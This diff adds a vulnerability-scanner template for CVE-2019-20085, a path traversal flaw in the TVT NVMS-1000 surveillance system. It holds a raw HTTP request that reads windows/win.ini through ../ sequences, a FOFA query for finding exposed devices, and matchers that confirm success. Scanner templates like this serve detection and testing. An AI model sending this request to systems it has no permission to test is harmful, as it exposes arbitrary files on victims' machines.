@@ -1,0 +1,44 @@
+id: TVTshumakeji-NVMS-1000-directory-traversal
+
+info:
+  name: TVT数码科技-NVMS-1000-路径遍历漏洞
+  author: candada
+  severity: high
+  description: 'TVT数码科技 TVT NVMS-1000是中国TVT数码科技公司的一套网络监控视频管理系统。 TVT数码科技 TVT NVMS-1000中存在路径遍历漏洞。远程攻击者可通过发送包含/../的特制URL请求利用该漏洞查看系统上的任意文件。'
+  reference:
+    - https://www.saury.net/1875.html
+  tags: 2024,TVT数码科技,directory-traversal
+  metadata:
+    fofa-query: app="TVT-NVMS-1000"
+  classification:
+    cvss-metrics: 
+    cvss-score:                                                   
+    cve-id: CVE-2019-20085    
+    cwe-id:                                                    
+    epss-score:                                              
+    epss-percentile:                                           
+    cpe:       
+
+
+http:
+  - raw:
+      - |+
+        GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[fonts]'
+      - type: status
+        status:
+          - 200
